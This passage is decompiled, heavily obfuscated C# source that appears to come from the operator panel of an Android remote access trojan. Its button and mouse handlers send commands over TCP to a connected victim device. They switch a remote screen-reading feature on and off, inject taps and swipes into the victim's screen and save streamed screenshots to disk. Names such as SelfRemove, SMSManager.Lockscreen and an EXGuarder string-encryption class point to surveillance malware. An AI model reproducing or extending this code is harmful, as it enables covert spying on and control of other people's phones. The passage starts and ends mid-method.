            str2 += Conversions.ToString(Strings.Chr(Convert.ToInt32(str3)));
            num1 = (int) num3 * -1731683889 ^ 817078958;
            continue;
          case 12:
            checked { ++index; }
            num1 = (int) num3 * 1926140788 ^ -1710954617;
            continue;
          case 13:
            strArray2 = strArray1;
            index = 0;
            num1 = (int) num3 * 1108417614 ^ 271118094;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str1;
    }

    private void Enablebtn_Click(object sender, EventArgs e)
    {
label_0:
      int num1 = 1634416174;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int num4;
        int num5;
        TcpClient client;
        string[] strArray;
        object[] ParametersObjects;
        switch ((num3 = (uint) ~(~-(((219778246 ^ (11946757 - -130431105) * -111921875) - (~-241979447 + (--152444068 + 196073077)) ^ ~(2115696869 - 2053415648 + (-1862278819 ^ -822052296)) - ~(-1974406651 * (700312451 * -285974602))) - num2) - -2119268272 * -663340095 ^ -1650007957 ^ -1236454181)) % 15U)
        {
          case 0:
            num5 = 0;
            num1 = (int) num3 * -504575691 ^ -1302737428;
            continue;
          case 1:
            num4 = 0;
            num1 = (int) num3 * 1341227700 ^ 874189762;
            continue;
          case 2:
            num1 = (int) num3 * 1297575982 ^ -664753689;
            continue;
          case 3:
            this.disablebtn.Enabled = true;
            num1 = (int) num3 * 1390724677 ^ -723416471;
            continue;
          case 4:
            num1 = 1840309609;
            continue;
          case 5:
            int num6 = Operators.CompareString(MyProject.Forms.Ports.Label3.Text, this.asab(EXGuarder.\u0031B4B6445), false) != 0 ? 1486239616 : (num6 = 1934529411);
            num1 = num6 ^ (int) num3 * 390559713;
            continue;
          case 6:
            this.enablebtn.Enabled = false;
            num1 = (int) num3 * 2068570970 ^ -1704579605;
            continue;
          case 7:
            strArray = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
            num1 = (int) num3 * 1743056049 ^ 2032340609;
            continue;
          case 8:
            goto label_2;
          case 9:
            goto label_0;
          case 10:
            num1 = (int) num3 * 1667396961 ^ 274401105;
            continue;
          case 11:
            ((SelfRemove) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 166542449 ^ 1459599043;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient;
            num1 = (int) num3 * -2101828043 ^ -2026903669;
            continue;
          case 13:
            int num7 = ((SelfRemove) this).classClient == null ? 1554261051 : (num7 = -51643622);
            num1 = num7 ^ (int) num3 * 98553968;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034F371363 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num5) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num4) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031B5F0A49),
              (object) ((SelfRemove) this).classClient
            };
            num1 = (int) num3 * 1047238374 ^ 1940573445;
            continue;
          default:
            goto label_16;
        }
      }
label_2:
      return;
label_16:;
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
      this.viewpic.Image = Codes.BlankImage();
    }

    private void Disablebtn_Click(object sender, EventArgs e)
    {
      if (((SelfRemove) this).classClient == null)
        return;
label_1:
      int num1 = -310882310;
      TcpClient client;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~((-(-num1 + (-(1807715875 + --957983057) - --(-1866960657 - 2140349686))) ^ (528173416 + 127691756) * -1565176451) + (1619750636 ^ 287269399))) % 7U)
        {
          case 0:
            goto label_9;
          case 1:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient;
            num1 = (int) num2 * -689984263 ^ 1692833515;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((SelfRemove) this).classClient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003190A2162 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003004D7944),
              (object) ((SelfRemove) this).classClient
            });
            num1 = (int) num2 * 1222323572 ^ 1118871419;
            continue;
          case 3:
            goto label_1;
          case 4:
            strArray = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
            num1 = (int) num2 * -1255667275 ^ 341391740;
            continue;
          case 5:
            this.disablebtn.Enabled = false;
            num1 = (int) num2 * 864007661 ^ 997867067;
            continue;
          case 6:
            this.enablebtn.Enabled = true;
            num1 = (int) num2 * 151097577 ^ 989845858;
            continue;
          default:
            goto label_10;
        }
      }
label_9:
      return;
label_10:;
    }

    private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
    {
      if (((SelfRemove) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
label_2:
        int num1 = 1492767996;
        object[] ParametersObjects;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~num1 * -459909093 - (-~-686697146 ^ -1041574199 * -116344416 - (-1267996102 - -2007837700))) * 1636315375)) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00308526411 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0033F280620),
                (object) ((SelfRemove) this).classClient
              };
              num1 = (int) num2 * -109295980 ^ -1645172462;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        ((SelfRemove) this).classClient.SendMessage(ParametersObjects);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (((SelfRemove) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((SelfRemove) this).classClient.SendMessage(new object[4]
        {
          (object) ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035555314F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u00360022B1A),
          (object) ((SelfRemove) this).classClient
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_3:
        int num1 = 1159870020;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-1552283286 - -(num2 * 719954831 - ((-(860050542 - 1308098409) ^ -1343378569 + (1702673808 + 2051528748)) + ~((-1896513123 ^ -530220738) * -1236387143)))) * 2080558353 ^ 531512629)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num3 * 1308194874 ^ 1449506045;
              continue;
            case 2:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
    }

    private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
    {
      if (((SelfRemove) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
label_2:
        int num1 = 275415538;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 * -737054603 ^ -(353699165 + ((287806792 ^ -1089086586) + -2047023603))) - 205079760 + ~(-1019488980 * -775120809) ^ 545805879 ^ 912751159 ^ -1945491582)) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              goto label_7;
            case 2:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((SelfRemove) this).classClient.SendMessage(new object[4]
              {
                (object) ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033D392F78 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0031E45466C),
                (object) ((SelfRemove) this).classClient
              });
              num1 = (int) num2 * 1150048307 ^ 290757218;
              continue;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Livepicbox_MouseDown(object sender, MouseEventArgs e)
    {
    }

    private void Livepicbox_MouseUp(object sender, MouseEventArgs e)
    {
    }

    private void Livepicbox_MouseMove(object sender, MouseEventArgs e)
    {
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
      ((SelfRemove) this).ScreenShotFoucs = false;
label_1:
      int num1 = 1346668650;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(-(num1 ^ 977347417 * -(-1549917373 ^ -316685611) - ((~-1640008435 ^ -2011080619 * -1072734753) - (1496566191 + 649757284 + 1107383065 * 1368970515)) ^ 426476520 * -1228326047 - ---673567144 - (-1609349777 ^ --421497883 + (983822926 ^ -2147114814))) * 1588649897 - (1879131534 - 1830475399 + (1821422220 - 1643952730))) - -505354955)) % 8U)
        {
          case 0:
            ((ScreenShoter) this).Trakpoint = new List<Point>();
            ((ScreenShoter) this).Trakpoint.Add(new Point(e.X, e.Y));
            num1 = (int) num2 * 351958475 ^ -1445407233;
            continue;
          case 1:
            int num3 = e.Button != MouseButtons.Left ? -1819865619 : (num3 = 943856866);
            num1 = num3 ^ (int) num2 * -1334224959;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -1907407327 ^ 681534005;
            continue;
          case 4:
            ((ScreenShoter) this).isclick = false;
            num1 = (int) num2 * 1759729238 ^ 1823659237;
            continue;
          case 5:
            goto label_3;
          case 6:
            ((ScreenShoter) this).isdown = true;
            num1 = (int) num2 * 1739243623 ^ 1112912426;
            continue;
          case 7:
            this.presstimer.Enabled = true;
            ((ScreenShoter) this).isclick = true;
            num1 = -355629042;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    private void Viewpic_MouseMove(object sender, MouseEventArgs e)
    {
      if (!((ScreenShoter) this).isdown)
        return;
label_1:
      int num1 = -888379933;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(-930168080 * -1877147059 * -1405776915 - (~((--1165543921 ^ 20536038 * -973511887) - num2) ^ 1656293241 * (2115994971 - 58916989) + ~(1599751823 ^ -767116691))) * 2044521715)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            ((ScreenShoter) this).isclick = false;
            num1 = (int) num3 * 1259936052 ^ 2010021749;
            continue;
          case 2:
            ((ScreenShoter) this).Trakpoint.Add(new Point(e.X, e.Y));
            num1 = (int) num3 * 149825094 ^ 2131239495;
            continue;
          case 3:
            goto label_7;
          case 4:
            ((ScreenShoter) this).Swaping = true;
            num1 = (int) num3 * -1479250607 ^ -483102266;
            continue;
          default:
            goto label_8;
        }
      }
label_7:
      return;
label_8:;
    }

    private void Viewpic_MouseUp(object sender, MouseEventArgs e)
    {
      ((ScreenShoter) this).isdown = false;
      int width = this.viewpic.Width;
      int height = this.viewpic.Height;
label_1:
      int num1 = 545882112;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 - (~(~~-2005194856 ^ -1842825254) ^ ~(1508845394 ^ -(804859987 * 1206077159)))) * 2049398595)) % 5U)
        {
          case 1:
            ((ScreenShoter) this).Swaping = false;
            num1 = (int) num2 * -992037708 ^ 358012942;
            continue;
          case 2:
            if (!((ScreenShoter) this).isclick)
            {
              num1 = (int) num2 * 1663800373 ^ 1992829941;
              continue;
            }
            goto label_30;
          case 3:
            if (((ScreenShoter) this).Swaping)
            {
              num1 = (int) num2 * 913739686 ^ -1879160533;
              continue;
            }
            goto label_21;
          case 4:
            goto label_1;
          default:
            goto label_8;
        }
      }
label_21:
      return;
label_8:
      ((ScreenShoter) this).Trakpoint.Add(new Point(e.X, e.Y));
      StringBuilder stringBuilder = new StringBuilder();
      List<Point>.Enumerator enumerator;
      try
      {
        enumerator = ((ScreenShoter) this).Trakpoint.GetEnumerator();
label_15:
        int num3 = enumerator.MoveNext() ? -1923573591 : (num3 = -767881486);
        Point current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) -((num3 - (~(~~-2005194856 ^ -1842825254) ^ ~(1508845394 ^ -(804859987 * 1206077159)))) * 2049398595)) % 5U)
          {
            case 0:
              num3 = -1923573591;
              continue;
            case 1:
              goto label_15;
            case 2:
              Point point = new Point(checked ((int) Math.Round(unchecked ((double) current.X * (double) ((SelfRemove) this).ScreenSize.Width / (double) width))), checked ((int) Math.Round(unchecked ((double) current.Y * (double) ((SelfRemove) this).ScreenSize.Height / (double) height))));
              stringBuilder.Append(point.ToString() + EXGuarder.\u0031E572F1B);
              num3 = (int) num4 * -77482668 ^ -67167456;
              continue;
            case 4:
              current = enumerator.Current;
              num3 = -431401754;
              continue;
            default:
              goto label_18;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
      }
label_18:
      string[] strArray1 = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
label_19:
      int num5 = -2013788429;
label_20:
      string str1;
      object[] ParametersObjects;
      Point point1;
      while (true)
      {
        uint num6;
        switch ((num6 = (uint) -((num5 - (~(~~-2005194856 ^ -1842825254) ^ ~(1508845394 ^ -(804859987 * 1206077159)))) * 2049398595)) % 14U)
        {
          case 0:
            string str2 = str1;
            int num7 = point1.X;
            string str3 = num7.ToString();
            string str4 = EXGuarder.\u0031E572F1B;
            num7 = point1.Y;
            string str5 = num7.ToString();
            str1 = str2 + str3 + str4 + str5;
            num5 = (int) num6 * -803667888 ^ 394434872;
            continue;
          case 1:
            string[] strArray2 = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((SelfRemove) this).Client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00369295C68 + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00362496217),
              (object) ((SelfRemove) this).classClient
            };
            num5 = (int) num6 * 38773381 ^ -1955882447;
            continue;
          case 2:
            goto label_19;
          case 3:
            str1 = EXGuarder.\u0035B135818;
            num5 = (int) num6 * 374582939 ^ -1412870173;
            continue;
          case 4:
            goto label_16;
          case 5:
            int num8 = ((Updater) this).tiks <= 3 ? -1528241556 : (num8 = 723266109);
            num5 = num8 ^ (int) num6 * -1042795641;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((SelfRemove) this).classClient.SendMessage(new object[4]
            {
              (object) ((SelfRemove) this).Client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00369295C68 + stringBuilder.ToString() + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00362496217),
              (object) ((SelfRemove) this).classClient
            });
            num5 = (int) num6 * -1185935308 ^ 973289672;
            continue;
          case 7:
            str1 = EXGuarder.\u00340644F29;
            num5 = (int) num6 * 1425756380 ^ 1601789861;
            continue;
          case 8:
            goto label_30;
          case 9:
            num5 = (int) num6 * 1671503384 ^ 1068169377;
            continue;
          case 10:
            Point client = this.viewpic.PointToClient(Control.MousePosition);
            point1 = new Point(checked ((int) Math.Round(unchecked ((double) client.X * (double) ((SelfRemove) this).ScreenSize.Width / (double) width))), checked ((int) Math.Round(unchecked ((double) client.Y * (double) ((SelfRemove) this).ScreenSize.Height / (double) height))));
            num5 = (int) num6 * -1415662852 ^ 919033135;
            continue;
          case 11:
            this.presstimer.Stop();
            num5 = (int) num6 * -147755064 ^ -1767981030;
            continue;
          case 12:
            ((Updater) this).tiks = 0;
            num5 = -1563627051;
            continue;
          case 13:
            ((SelfRemove) this).classClient.SendMessage(ParametersObjects);
            num5 = (int) num6 * -2092004417 ^ 1008562266;
            continue;
          default:
            goto label_12;
        }
      }
label_16:
      return;
label_12:
      return;
label_30:
      this.presstimer.Enabled = false;
      num5 = -1990645736;
      goto label_20;
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        string path = ((SelfRemove) this).DownloadsFolder + EXGuarder.\u0034E4B4519;
label_1:
        int num1 = 800881489;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~((num1 ^ ~~(-1021304429 * -913208505 + 865728244 + (--1981837699 ^ 234281986))) + (~~-1855062415 ^ -1716513882 - (76978768 ^ -471596207)) * 19755529 - (~(1823760188 - 2075235176) - (455771040 - -72673353 ^ --1013135832)) - -~-1519948932)) % 10U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3;
              num1 = num3 = !Directory.Exists(path) ? 257645225 : (num3 = -525994502);
              continue;
            case 2:
              goto label_3;
            case 3:
              Directory.CreateDirectory(path);
              num1 = (int) num2 * -1279843599 ^ -1122513031;
              continue;
            case 4:
              this.savetimer.Stop();
              num1 = -118449432;
              continue;
            case 5:
              this.savetimer.Dispose();
              num1 = (int) num2 * 1076385589 ^ 993293938;
              continue;
            case 6:
              int num4 = Directory.Exists(path) ? 1900689350 : (num4 = 335302936);
              num1 = num4 ^ (int) num2 * -1610862981;
              continue;
            case 7:
              this.viewpic.Image.Save(path + EXGuarder.\u0034C07056D + DateAndTime.Now.ToString(EXGuarder.\u003285F5A68) + EXGuarder.\u0030801010D, ImageFormat.Jpeg);
              num1 = (int) num2 * -1506278975 ^ -1767351207;
              continue;
            case 8:
              int num5 = !this.Save.Checked ? 613417519 : (num5 = -775971479);
              num1 = num5 ^ (int) num2 * 100566405;
              continue;
            case 9:
              num1 = (int) num2 * 917215523 ^ -1400497640;
              continue;
            default:
              goto label_13;
          }
        }
label_3:
        return;
label_13:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void ScreenReaderV2_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (((SelfRemove) this).classClient == null)
        return;
label_1:
      int num1 = 718687083;
      TcpClient client;
      object[] ParametersObjects;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~((num1 + --(~~400039615 ^ -~-2042645961) ^ --~-314162283 + (~(-1422854892 - 1210308034) + (-1327358650 * -1754630601 + --525213066))) * 1644393381 * -1114838553)) % 7U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033F1F6D42 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0035C3C204A),
              (object) ((SelfRemove) this).classClient
            };
            num1 = (int) num2 * 1853906578 ^ 1245892976;
            continue;
          case 1:
            strArray = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
            num1 = (int) num2 * 1322886084 ^ 397820770;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient;
            num1 = (int) num2 * 320587924 ^ -1844542314;
            continue;
          case 3:
            goto label_9;
          case 4:
            this.enablebtn.Enabled = true;
            this.disablebtn.Enabled = false;
            num1 = (int) num2 * -787747848 ^ -1259379512;
            continue;
          case 5:
            goto label_1;
          case 6:
            ((SelfRemove) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -233962891 ^ -1574961315;
            continue;
          default:
            goto label_10;
        }
      }
label_9:
      return;
label_10:;
    }

    private void Hidetoolbtn_Click(object sender, EventArgs e)
    {
      if (!Operators.ConditionalCompareObjectEqual(this.keyboardpanel.Tag, (object) EXGuarder.\u00336144F5F, false))
        goto label_7;
label_1:
      int num1 = 455993255;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~~(num1 - (-~-654870325 - (254488745 * 125237271 ^ -1953413967) + ~(-1106877722 - (-1012436886 - 706486342) - (-279235993 - (1085331487 - -583580941)))) ^ ~((~1931699415 ^ -1661097945) - (--935657084 ^ -1669838563 * 895089459))) ^ 1653688496) * 2145841133)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.keyboardpanel.BringToFront();
            num1 = (int) num2 * -1941552126 ^ 128223280;
            continue;
          case 3:
            num1 = (int) num2 * 41691545 ^ 200895553;
            continue;
          case 4:
            this.keyboardpanel.Tag = (object) EXGuarder.\u003571C2464;
            num1 = (int) num2 * 858166927 ^ 1818856507;
            continue;
          case 5:
            goto label_7;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_7:
      this.keyboardpanel.SendToBack();
      this.keyboardpanel.Tag = (object) EXGuarder.\u00336144F5F;
      num1 = -2103021300;
      goto label_2;
    }

    private void DrakeUIAvatar2_Click(object sender, EventArgs e)
    {
      if (((SelfRemove) this).classClient == null)
        return;
label_1:
      int num1 = -804175877;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(-(~((~(717324042 ^ 982337881) * -1651087267 ^ ~~791845579 ^ ~-369108530) - num2) ^ -1354133565) ^ -436130824 ^ -1293236664)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((SelfRemove) this).classClient.SendMessage(new object[4]
            {
              (object) ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient,
